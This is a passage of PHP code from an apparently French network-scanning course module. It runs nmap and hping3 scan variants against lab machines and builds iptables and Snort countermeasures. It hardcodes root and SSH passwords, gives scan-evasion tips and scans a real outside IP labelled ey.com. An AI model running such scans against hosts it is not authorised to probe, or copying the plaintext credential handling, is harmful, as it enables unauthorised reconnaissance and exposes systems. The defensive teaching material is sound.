\t   | Header Length |   Reserved    | W | C | R | C | S | S | Y | I |
\t   |               |               | R | E | G | K | H | T | N | N |
\t   +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
\n
FLAGS;
		echo $flags_tcp;
		$this->pause();
		// ############################################################################
	
		// ########################################## TCP CONNECT #######################
		$this->important("activer les Hosts $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08");
		$this->titre("0x030101 Scan TCP");
		$this->img("scan/3wayHand.png");
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -Pn -sT -r -p 21,22,23,25,53,80,81,137,139,443,445 --reason --packet-trace -vvv -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08");
		$this->pause();
		$this->note("For each open port Nmap displays the service that should theoretically be launched on the corresponding port.
		It is interesting to note that no actual checking is done at this point.
		The services shown correspond to a list based on port number in the file -> / usr / share / nmap / nmap-services.
		Indeed, it may well start an FTP server on port 80, then it is usually reserved for HTTP protocol (Web Server) ");
	
	
		$this->ssTitre("Capture Traffic with tcpdump ");
		$this->net("http://www.tcpdump.org/manpages/tcpdump.1.html");
		$file_pcap = pcap4eth( $eth_wan, 10, "");
		pcap2csv($file_pcap, "-e frame.number -e ip.src -e ip.dst -e frame.len -e frame.time");
	
		// ##############################################################################
	
		$this->pause ();
		// ##################### Stealth/SYN/half-open scan #############################
		$this->titre("0x030102 Scan Stealth/SYN/half-open");
		$this->ssTitre("SYN SCAN");
		echo $scan_syn;pause();
		$this->article("-sS= --scanflags SYN", "This method is not to open a full TCP connection as before.
This technique is commonly called half-open or stealth scan or Stealth / SYN.
The principle of operation is as follows: a SYN flag is sent to the target station and the response expected.
If a SYN / ACK is received it means that the port is open. Assume that the port is closed then if the answer is a RST.
When Nmap detects an open port, it suddenly cut off the connection with a RST.
It is mandatory to be root to use this method and those that follow.");
		$this->pause();
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -sS -r -Pn -p 21,22,23,25,53,80,81,137,139,443,445 --reason -vvv -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 --packet-trace");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,443,445 --syn -I $this->eth_lan -V");
		$this->pause();
		$this->note("Initially make the SYN scan less detectable by the detection systems. However, nowadays almost all of IDS (Intrusion Detection System) detects this type of scan easily.");
		// ###############################################################################
	
		$this->pause ();
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S wireshark -i $this->eth_lan -k");
		$this->pause ();
		// ##################### SYN PUSH Scan ################################################
		$this->titre("0x030103 Scan SYN/PUSH");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags SYNPSH -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08  ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -SP -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
		$this->note("Windows XP, 7, 2008 Serveur repondent aux syn push");
		$this->pause ();
		// ##################### SYN URG Scan #############################################
		$this->titre("0x030104 Scan SYN/URG");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags SYNURG -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08  ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -SU -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
	
		$this->note("Windows XP, 7, 2008 Serveur repondent aux syn urg");
		$this->pause ();
		// ###################### SCAN SYN/FIN #########################################
		$this->titre("0x030105 SCAN SYN/FIN");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -Pn --scanflags SYNFIN -p 21,22,23,25,53,80,81,137,139,445 --reason -r -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -SF -I $this->eth_lan -V");
		$this->pause();
		// #############################################################################
	
		$this->note("Windows XP repond au close et open tandis que 7, 2008 Serveur ne repondent pas aux syn fin");
		$this->pause ();
		// ##################### SYN FIN PUSH Scan ########################################
		$this->titre("0x030106 Scan SYN/FIN/PUSH");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags SYNFINPSH -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -SFP -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
		$this->note("Windows XP repond au close et open tandis que 7, 2008 Serveur ne repondent pas aux syn fin push");
		$this->pause ();
		// ##################### SYN URG PUSH Scan ########################################
		$this->titre("0x030107 Scan SYN/URG/PUSH");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags SYNURGPSH -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -SUP -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
		$this->pause ();
		// ##################### SYN URG PUSH FIN Scan ########################################
		$this->titre("0x030108 Scan SYN/URG/PUSH/FIN");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags SYNURGPSHFIN -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -SUPF -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
		$this->pause ();
	
		// ##################### FIN Scan ################################################
		$this->titre("0x030200 Scan FIN");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -Pn -r -sF -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 --fin -I $this->eth_lan -V");
		$this->pause();
		// ###############################################################################
	
		$this->pause ();
	
		// ##################### URG Scan ########################################
		$this->titre("0x030300 Scan URG");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags URG -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 --urg -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
		$this->pause ();
		// ##################### URG PUSH Scan ########################################
		$this->titre("0x030301 Scan URG/PUSH");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags URGPSH -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -UP -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
		$this->pause ();
	
		// ##################### URG FIN Scan ########################################
		$this->titre("0x030302 Scan URG/FIN");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags URGFIN -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -UF -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
	
		$this->pause ();
		// ##################### PUSH Scan ########################################
		$this->titre("0x030400 Scan PUSH");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags PSH -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 --push -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
		$this->pause ();
		// ##################### PUSH FIN Scan ########################################
		$this->titre("0x030401 Scan PUSH/FIN");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags PSHFIN -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -PF -I $this->eth_lan -V");
		$this->pause();
		// ################################################################################
	
		$this->pause ();
		// ##################### NULL Scan ################################################
		$this->titre("0x030500 Scan NULL");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -Pn -sN -r -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -0 -I $this->eth_lan -V");
		$this->pause();
		// ###############################################################################
	
		$this->pause ();
		// ##################### XMAS Scan ################################################
		$this->titre("0x030600 Scan XMAS");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -sX -p 21,22,23,25,53,80,81,137,139,445 --reason -Pn -r -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08  ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 -UPF -I $this->eth_lan -V");
		$this->pause();
		$this->note("\n\t nmap -sX = hping3 -UPF\n\t hping3 --xmas = nmap --scanflags ECE");
		$this->pause();
		// ###############################################################################
	
		$this->pause ();
		// ##################### ECE Scan ########################################
		$this->titre("0x030700 Scan ECE: ECN-Echo");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags ECE -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 --xmas -I $this->eth_lan -V");
		$this->pause();
		$this->note("\n\t hping3 --xmas = nmap --scanflags ECE\n\t nmap -sX = hping3 -UPF");
		$this->pause();
		// ################################################################################
	
		$this->pause ();
		// ##################### CWR Scan ########################################
		$this->titre("0x030800 Scan CWR: Congestion Window Reduced");
		$this->ssTitre("With NMAP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags CWR -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 --ymas -I $this->eth_lan -V");
		$this->pause();
		$this->note(" hping3 --ymas = nmap --scanflags CWR");
		$this->pause();
		// ################################################################################
	
		$this->pause ();
		$this->ssTitre("Scan FIN/NULL/XMAS/ECE/CWR/PUSH/URG");
		echo $scan_other_syn;
		$this->pause ();
		$this->note("no distinction between open and closed Port for Windows OS");
		$this->pause ();
		// ##################### IDLE/Furtif SCAN ###################################
		// hping3 --listen --seqnum -I vmnet2 -V -> see id
		// ipgrab -i vmnet2
		$this->titre("0x030900 SCAN: IDLE ");
		$this->net("http://nmap.org/book/idlescan.html");
		$this->net("http://en.wikipedia.org/wiki/Idle_scan");
		$this->pause();
		$this->article("1st window", "send continous request to Windows");
		$this->article("2nd window", "We do like windows which sends a SYN packet (spoof my IP address with that of intermediate windows) to host you want to scan (Linux / Windows), if the port of the target (Linux / windows) is open then we will see the id (first window increase +3).\nif closed -> no big change on id -> +1");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S hping3 -SA -r $this->xp");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S hping3 --scan 22 -S $this->msf -a $this->xp -V");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S hping3 --scan 81 -S $this->msf -a $this->xp -V");
		$this->pause();
		$this->ssTitre("On Linux");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -r -Pn -p 21,22,23,25,53,80,81,137,139,445 --packet-trace --reason -v -sI $this->xp $this->msf -e $this->eth_lan");
		$this->pause();
		$this->ssTitre("On WIndows OS");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -r -Pn -p 21,22,23,25,53,80,81,137,139,445 --packet-trace --reason -v -sI $this->msf $this->xp -e $this->eth_lan");
		$this->note("We must get a host with IP ID changing in this case -> Windows OS");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S hping3 -SA -r $this->msf");
		$this->pause();
		$this->ssTitre("Trouver les hosts ou c'est possible de faire un IDLE Scan");
		$this->requette("echo '$this->root_passwd' | sudo -S msfcli auxiliary/scanner/ip/ipidseq RHOSTS=10.50.10.0/24 INTERFACE=$this->eth_lan E");
		// ###############################################################################
	
		$this->pause ();
		// ####################### UDP Scan ################################################
		$this->titre("0x031000 Scan UDP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -Pn -sU -p 21,22,23,25,53,80,81,137,139,445 -r --reason -e $this->eth_lan  $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 | egrep \"hack|udp\"");
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->xp --scan 21,22,23,25,53,80,81,137,139,445 --udp -I $this->eth_lan -V");
		$this->note("hping3 don't detect open UDP ports !!");
		$this->pause();
		$this->note("you may have noticed that this method is extremely slow compared to TCP scan. Indeed, the operating system imposes a limit on the number of ICMP error sent per second.
	
For example, Linux limits the messages (ICMP destination unreachable) every 4 to 80 seconds. Solaris is even more strict with only two messages per second.
	
Nmap then automatically adjusts the scan speed to avoid flooding the network with packets that would be rejected by the target. An interesting note for operating systems that do not meet the standards as Microsoft Windows is developed that can scan very quickly.");
		$this->pause();
		// ###############################################################################
	
		$this->pause ();
		$this->ssTitre("Scan UDP");
		echo $scan_udp;
		$this->pause ();
		// ##################### ALL FLAGS Scan ########################################
		$this->titre("0x031200 Scan ALL -> flags SFRPAUEC -> --scanflags SYNFINRSTPSHACKURGECECWR");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -r --scanflags ALL -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ");
		$this->pause();
		$this->note("Scan ALL flags is No Useful -> no distinction between Open and Close Port");
		$this->pause();
		// ################################################################################
	
	
	
		$this->pause ();
	
		// ##################### Contre Mesures de SCAN #################################
		$this->titre("0x031400 Countermeasure SCAN SYN+TCP in Firewall");
		ssh($this->msf, "root", "rohff", 'iptables -F;iptables -X');
		$this->pause();
		$this->article("TCP", "Open scan techniques are too easy to detect and filter.
This type of scan method involves opening a full connection to the remote computer using TCP / IP agreement in three classic stages");
		$this->pause();
		$this->ssTitre("Scanning TCP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sS -p 21,22,23,25,53,80,81,137,139,445 -r --open --reason -e $this->eth_lan $this->msf -oX $this->dir_tmp/scan_tcp_no_fw.xml | egrep \"hack|tcp\"");
		$this->pause();
		$this->ssTitre("Scanning UDP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sU -p 53,137,139 -r --open --reason -e $this->eth_lan $this->msf -oX $this->dir_tmp/scan_udp_no_fw.xml | egrep \"hack|udp\"");
		$this->pause();
		$iptables = "iptables -N synScan;iptables -A synScan -p TCP -m state --state NEW -m limit --limit 1/s --limit-burst 1 -j RETURN;iptables -A synScan -p TCP -j LOG --log-prefix \"ROHFF SYN SCAN Reject: \";iptables -A synScan -p TCP -j REJECT --reject-with tcp-reset;iptables -A INPUT -p TCP --syn -j synScan; iptables -N udpScan;iptables -A udpScan -p UDP -m state --state NEW -m limit --limit 1/s --limit-burst 1 -j RETURN;iptables -A udpScan -p UDP -j LOG --log-prefix \"ROHFF UDP SCAN Reject: \";iptables -A udpScan -p UDP -j REJECT --reject-with port-unreach;iptables -A INPUT -p UDP -j udpScan";
		ssh($this->msf, "root", "rohff", "$iptables");
		$this->pause();
		ssh($this->msf, "root", "rohff", 'iptables -L -nv');
		$this->pause();
		$this->ssTitre("Scanning TCP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sS -p 21,22,23,25,53,80,81,137,139,445 -r --reason -e $this->eth_lan $this->msf | egrep \"hack|tcp\"");
		$this->pause();
		$this->ssTitre("Scanning UDP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sU -p 53,137,139 -r --reason -e $this->eth_lan $this->msf | egrep \"hack|udp\"");
		$this->pause();
		$this->ssTitre("Countermeasure -> change Time for scanning -> 1 scan/2 second");
		$this->ssTitre("TCP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sS -p 21,22,23,25,53,80,81,137,139,445 --reason --open -r -e $this->eth_lan $this->msf --scan-delay 2 -oX $this->dir_tmp/scan_tcp_fw.xml | egrep \"hack|tcp\"");
		$this->pause();
	
		$this->article("Exemple live de fw","ey.com ");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -sA -Pn -n --reason  --top-ports 10  199.52.9.62 ");
		sleep(1);
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -sS -Pn -n --reason -p 80,443 --scan-delay 2 --open 199.52.9.62");
		$this->pause();
	
	
		// requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 --syn -I $this->eth_lan -V -i u2000000");pause();
		$this->ssTitre("UDP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sU -p 53,137,139 --reason --open -r -e $this->eth_lan $this->msf --scan-delay 2 -oX $this->dir_tmp/scan_udp_fw.xml | egrep \"hack|udp\"");
		$this->pause();
		$this->requette("ndiff $this->dir_tmp/scan_tcp_no_fw.xml $this->dir_tmp/scan_tcp_fw.xml");
		$this->requette("ndiff $this->dir_tmp/scan_udp_no_fw.xml $this->dir_tmp/scan_udp_fw.xml");
		$this->pause();
		ssh($this->msf, "root", "rohff", 'iptables -F;iptables -X');
		$this->pause();
		$this->note("To deceive the vigilance detection systems (NIDS/NIPS) and firewalls, scans can be done in a random order, with an excessively slow speed (eg several days), or from multiple IP addresses.");
	
	
	
		$this->titre("0x031500 Countermeasure SCAN Using snort as NIDS to detect Port Scanning");
		$this->requette("ls /etc/snort/rules/*.rules");
		$this->pause();
		$this->requette("grep -i scan /etc/snort/rules/*.rules | grep -i nmap");
		$this->pause();
		$this->ssTitre("Countermeasure SCAN FIN/NULL/RST/URG/PUSH/XMAS/ECE/CWR");
		$this->ssTitre("SCAN FIN");
		$this->requette("grep -n 'SCAN FIN' /etc/snort/rules/scan.rules");
		$this->pause();
		$this->ssTitre("SCAN NULL");
		$this->requette("grep -n 'SCAN NULL' /etc/snort/rules/scan.rules");
		$this->pause();
		$this->ssTitre("SCAN XMAS");
		$this->requette("grep -n 'flags:FPU' /etc/snort/rules/scan.rules");
		$this->pause();
		$this->ssTitre("SCAN SYN/RST");
		$this->requette("grep -n 'SYN RST' /etc/snort/rules/emerging-scan.rules");
		$this->pause();
		$this->ssTitre("SCAN SYN/FIN");
		$this->requette("grep -n 'SCAN SYN FIN' /etc/snort/rules/scan.rules");
		$this->pause();
		$this->ssTitre("Make Our custom snort rules");
		$this->requette("echo 'alert tcp any any -> any any (msg:\"Rohff SCAN FIN\"; flow:stateless; flags:F; sid:1000001;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN NULL\"; flow:stateless; flags:0; sid:1000002;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN XMAS\"; flow:stateless; flags:FPU; sid:1000003;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN SYN FIN\"; flow:stateless; flags:SF; sid:1000004;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN SYN RST\"; flow:stateless; flags:SR; sid:1000005;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN flag ALL\"; flow:stateless; flags:SFRPAUEC; sid:1000007;)\n' > $this->dir_tmp/rohff_scan.rules");
		$this->pause();
		$this->requette("gedit $this->dir_tmp/rohff_scan.rules");
		$this->pause();
	
		$snort = "echo '$this->root_passwd' | sudo -S nmap -Pn -n -sF -p 80 --reason -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n -sN -p 80 --reason  -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n -sX -p 80 --reason  -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n --scanflags SYNFIN -p 80 --reason  -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n --scanflags SYNRST -p 80 --reason  -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n --scanflags SYNFINRSTPSHACKURGECECWR -p 80 --reason  -e $this->eth_lan $this->msf";
		$cmd1 = "echo '$this->root_passwd' | sudo -S snort -c $this->dir_tmp/rohff_scan.rules -A console -i $this->eth_lan ";
		$cmd2 = $snort;
		exec_parallel($cmd1, $cmd2, 1);
		$this->pause();
		$this->ssTitre("IP Fragmentation");
		$this->requette("grep 'SCAN NMAP -f -sF' /etc/snort/rules/*.rules");
		$this->pause();
		$this->cmd("localhost", "ipgrab -i $this->eth_lan");
		$this->requette("echo 'alert tcp any any -> any any (msg:\"Rohff SCAN Fragmentation IP\"; fragbits: R!;   sid:1000076;)' >> $this->dir_tmp/rohff_scan.rules");
		$this->pause();
		$cmd1 = "echo '$this->root_passwd' | sudo -S snort -c $this->dir_tmp/rohff_scan.rules -A console -i $this->eth_lan ";
		$cmd2 = "echo '$this->root_passwd' | sudo -S nmap -Pn -n -r -f -sF -p 80,81 --reason --packet-trace -vvv -e $this->eth_lan $this->msf ";
		exec_parallel($cmd1, $cmd2, 1);
		$this->pause();
		$this->article("SYN SCAN IDS/IPS", "use honeypot (next Module Enumering Target) for Syn Scan to detect malware behavior (see Enum Service");
		$this->pause();
		$this->ssTitre("Snort rules Price");
		$this->net("http://www.snort.org/vrt/buy-a-subscription");
		$this->pause();
		$this->note("Build your own rules with the last Vulnerabilities by using honeypot to collect information about attack (vuln)");
		$this->pause();
	
	
		$this->pause ();
		// ############################## SCANNING #####################################
		$this->titre("0x031300 Resume Scanning");
		$scan = <<<SCAN
                                         ______________
                                        |              |
                                        | type de scan |
                                        |______________|
            __________________________________|___________________________________
           /                  |                 \                  |              |
          /                   |                  \                 |              |
    _____|_______       ______|______        _____|_____      _____|_____     ____|_____
   |             |     |             |      |          |     |           |   |          |
   | scan ouvert |     | demi-ouvert |      |  furtif  |     | balayages |   |  divers  |
   |_____________|     |_____________|      |__________|     |___________|   |__________|
         |                    |                   |                |               |
   ______|_______        _____|____          _____|_____       ____|_____      ____|_____
  |              |      |          |        |           |     |          |    |          |
  | connect. TCP |      | SYN flag |        | drap. FIN |     | echo TCP |    | erreurs  |
  |______________|      |__________|        |___________|     |__________|    | UDP/ICMP |
         |                    |                   |                |          |__________|
  _______|_________    _______|_______       _____|_____       ____|_____           |
 |                 |  |               |     |           |     |          |     _____|______
 | ident. inversée |  |  IDLE   SCAN  |     | drap. ACK |     | echo UDP |    |            |
 |_________________|  | "scan muet"   |     |___________|     |__________|    | rebond FTP |
                      |_______________|           |                |          |____________|
                                             _____|______      ____|_____
                                            |            |    |          |
                                            | drap. NULL |    | TCP ACK  |
                                            |____________|    |__________|
                                                  |                |
                                             _____|_____       ____|_____
                                            |           |     |          |
                                            | drap. ALL |     | TCP SYN  |
                                            |  (XMAS)   |     |__________|
                                            |___________|          |
                                                  |             ___|_______
                                         _________|_________   |           |
                                        |                   |  | ICMP echo |
                                        | fragmentation tcp |  |___________|
                                        |___________________|
                                                  |
                                           _______|_______
                                          |               |
                                          | drap. SYN|ACK |
                                          |_______________|
\n
SCAN;
		echo $scan;
	
		// #############################################################################
		// 3 day FIN
	
		$this->pause ();
	
		$this->titre("Detect host Firewalled");
		// ##################### ACK FIREWALL ###############################################
		$this->titre("0x031100 Scan ACK -> Detect Firewall");
		/*
		 * Firewall/IDS Testing
		 * TCP Timestamp Filtering
		 *
		 * Many firewalls include a rule to drop TCP packets that do not have TCP Timestamp option set which is a common occurrence in popular
		 * port scanners. Simply add --tcp-timestamp option to append timestamp information:
		 *
		 * hping3 -S 72.14.207.99 -p 80 --tcp-timestamp
		 *
		 */
		$scan_ack = <<<SCAN
\t+----------------------------------------------------+
\t|\033[32mACK: ACK\033[0m                     |\033[36mOPEN\033[0m       |\033[36mClose\033[0m      |
\t+----------------------------------------------------+
\t|\033[36mLinux & Windows no Firewalled\033[0m|\033[37mRST\033[0m        |\033[37mRST\033[0m        |
\t+----------------------------------------------------+
\t|\033[36mLinux & Windows Firewalled\033[0m   |\033[37mno-response        \033[0m|\033[37mno-response\033[0m|
\t+----------------------------------------------------+\n
SCAN;
		$this->ssTitre("With NMAP");
		$query = "echo '$this->root_passwd' | sudo -S nmap -n -Pn -r -sA -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $dsl $this->msf $this->fw $dvl $this->owasp $this->win7 $win08 ";
		$this->requette($query);
		$this->pause();
		$this->ssTitre("With HPING3");
		$this->requette("echo '$this->root_passwd' | sudo -S hping3 $this->xp --scan 21,22,23,25,53,80,81,137,139,445 --ack -I $this->eth_lan -V");
		$this->pause();
		$this->titre("Enable the firewall on XP");
		/*
		 * ssh($this->xp,"rohff","hacker",'netsh firewall add portopening TCP 22 SSH enable subnet');
		 * pause();
		 * ssh($this->xp,"rohff","hacker",'netsh firewall set opmode enable');
		 * pause();
		 * ssh($this->xp,"rohff","hacker",'netsh firewall show config');
		 * pause();
		 * ssh($this->xp,"rohff","hacker",'netsh firewall show state');
		 * pause();
		 */
		$this->cmd($this->xp, "netsh firewall add portopening TCP 22 SSH enable subnet");
		$this->cmd($this->xp, "netsh firewall set opmode enable");
		$this->cmd($this->xp, "netsh firewall show config");
		$this->cmd($this->xp, "netsh firewall show state");
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -Pn -r -sA -p 21,22,23,25,53,80,81,137,139,445 --reason -e $this->eth_lan $this->xp $this->fw ");
		$this->pause();
		echo $scan_ack;
		$this->pause();
		$this->titre("Disable the firewall on XP");
		$this->cmd($this->xp, "netsh firewall set opmode disable");
		// ssh($this->xp,"rohff","hacker",'netsh firewall set opmode disable');
		// pause();
		// #############################################################################
	
		$this->ssTitre("TCP window scan");
		$this->article("closed", "means not firewalled");
		$this->article("filtred", "means firewalled");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -sW -Pn -v -n --top-ports 10  $this->fw $this->xp $win08 $this->lts --spoof-mac Cisco -e $this->eth_lan");
		$this->pause();
		$this->ssTitre("IP fragmentation");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -f -Pn -v -n --top-ports 10 $this->fw $this->xp $win08 $this->lts --spoof-mac Cisco -e $this->eth_lan");
		$this->pause();
		$this->pause ();
	
		$this->ssTitre("Scanning target for next Module");
		$domain = "hack.vlan";
		$this->article("TP", "Scan alive HOST du domain $domain Plage IP between 10.50.10.{1-100} -> find List $domain.ip qui contient les adresses IP (Future Cibles)");
		$this->pause ();
		$this->article("TCP", "nmap -Pn -n -p1-65535 -vvv --reason <Cible>");
